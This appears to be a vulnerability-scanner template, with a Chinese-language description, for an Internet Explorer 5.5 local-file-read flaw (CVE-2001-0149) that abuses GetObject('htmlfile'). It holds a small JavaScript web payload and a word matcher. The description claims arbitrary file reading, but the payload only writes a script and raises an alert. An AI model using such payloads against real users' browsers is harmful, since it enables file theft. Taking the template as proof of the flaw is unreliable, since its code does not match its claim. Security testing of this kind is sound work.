[info]
author = "ave"
description = "通过 GetObject JavaScript 函数与 htmlfile ActiveX 对象，在 IE 5.5 及更早版本中读取任意本地文件。攻击者托管恶意 HTML 页面，诱导用户访问后即可读取目标系统文件。"
id = "POC-AVE-2001-0057"
name = "Microsoft Internet Explorer Windows Script Host 文件读取漏洞 PoC"
severity = "medium"
tags = ["ave-2001-0057"]
vuln_id = [
    "CVE-2001-0149",
    "AVE-2001-0057",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc.html"
protocol = "http"

[poc.requests.body]
content = '''<html><body><script language="Javascript">var x=GetObject("htmlfile");x.open();x.write("<script language='Javascript'>function f(){return true;}<\/script>");x.close();document.write(x.documentElement.innerHTML);alert("File read test via GetObject htmlfile");</script></body></html>'''
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["GetObject"]
